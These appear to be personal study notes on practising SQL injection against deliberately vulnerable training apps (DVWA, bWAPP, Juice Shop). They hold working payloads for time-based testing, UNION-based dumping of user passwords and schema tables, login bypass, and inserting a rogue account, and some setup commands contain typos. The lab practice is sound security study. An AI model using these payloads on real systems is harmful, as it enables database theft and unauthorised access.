# DVWA SQL INJECTION NOTE

docker
	sudo systemctl restart docker (to restart docker)
		restart docker after installing any container
	cat /var/log/docker.log
		checking the docker daemon logs 
	sudo docker ps (list all running containers)
		lists all containers
	sudo docker images -aq(-a all -q quiet it lists the image ids in short) (lists all images )
	-d means detached ..or run in the background 


--FIRST AID 
	(when searching for sqli, after inputing the single quote without a response try using the 1=1 payload)
	;
	#
	'
	' or '1'='1#
	' or sleep(5)#
	;waitfor delay '0:0:5' #
	1 or 1=1
	or sleep(5) 
notes 
	used to breakout of the sql code('), (;) 
	testing the for vulnerability using delay 
		' or sleep(5)--
		' or sleep(5)#'
		; waitfor delay '0:0:5'-- 
	comment 
		#.
		--
DVWA
	installation
		docker pull kaakaww/dvwa-docker
		docker run -d -t -p 80:80 --name dvwa1 kaakaw/dvwa-docker
		sudo docker stop dvwa1 
			(it did'nt really work but running docker ps and then shutting it down with the name there works and also starting it was with running the second command)
# SQLI low security
goal= There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.			
		procedures
		-check the help
		- check the source code
		-intercept the userid submit request using burpuite proxy
		-send to burpsuite 
	-----
		analysis 
		 (to breakout of the sql code('), (;) )
			 -test for vulnerability using the delay function
				 ' or sleep(5)#'  (this delays for 25 seconds that means the parameter is vulnerable)
				 ' ||(select sleep(5))#'(this delays for 25 seconds)
				 ' or sleep(5)#' 
				 'waitfor delay '0:0:5'-- (500 internal error)
				 (-----)(sleep function was successful)
				-finding number of columns
					'order by 1# (200)
					'order by 2#(200)
					'order by 3#(500 internal error)
					this will return 200 , if it returns 500 that means its out of range
				- dumping all the columns
					1' or '1'='1
				--- 
					 ' union select user, password from users# (this returns all the usernames and password)
				----users
						'union select column_name, null from information_schema.columns where table_name = 'users'#
				---user_id, last_login
					'union select user_id, last_login from users#
				---information schema .table
					 'union select table_name, null from information_schema.tables#(this returns all the tables in the data base )
				----information schema
					 'union select column_name, null from information_schema.columns#(returns all the columns in the column table)
				 ---ALL_PLUGINS
					 'union select column_name, null from information_schema.columns where table_name = 'ALL_PLUGINS'#( this displays all the columns in the all plugins table)
				 ---PLUGIN_VERSION, PLUGIN_NAME
					 ' union select  PLUGIN_TYPE_VERSION, PLUGIN_LICENSE from ALL_PLUGINS#
				 ---FILES
					 'union select column_name , null from information_schema.columns where table_name = 'FILES'#
					 ---FILE_ID, FILE_TYPE 
					 ' union select ENGINE, FILE_ID FROM FILES#
# SQLI MEDIUM SECURITY
DESCRIPTION: The medium level uses a form of SQL injection protection, with the function of "[mysql_real_escape_string()](https://secure.php.net/manual/en/function.mysql-real-escape-string.php)". However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered.
		--NOTE
		codes can be injected into dropdown menus by inspecting it and injecting the code into the parameter 
		-- 
		(') Doesnt work ...returns a 500 error
		--
		' or '1'='1 # (doesnt work internal error )
		--
		1 or sleep(5) (the request sleeps for 5 seconds )
		--
		1 or 1=1 ( 200 this returns all the user and surname )
		this payload does not require quotes because in the original code there are no quotes to break out of
		-- 
		1 or 1=1 union select user, password from users 
		(this payload returns the initial request response and user , password )
# SQLI high security--
description; This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request.
		--ANALYSIS
			-- (') 200 
			--
			; or sleep(5) # (this is returned in the input parameter)
			-- 
			1' or '1'='1' (doesnt work, its been filtered)
			-- 
			'union select user, password from users# (this returns all the users and password)
	
bwapp
	installation
		docker pull jgraham20/bwapp-armhf
		docker run --rm -p 80:80 --name bwapp jgraham20/bwapp-armhf
		docker pull cambarts/arm-bwapp
		docker start bwapp
		docker stop bwapp

juiceshop 
	installation 
		docker pull bkimminich/juice-shop 
		docker run --rm -p 3000:3000 bkimminich:juice-shop
	ANALYSIS 
		first check the product reviews
		copy any uers username/email
		go to the login page 
		paste the username/email + ' or 1=1 #
		pwned###
			(mmm' insert into users(email, password) values ('nun@gmail', 'nun')#)
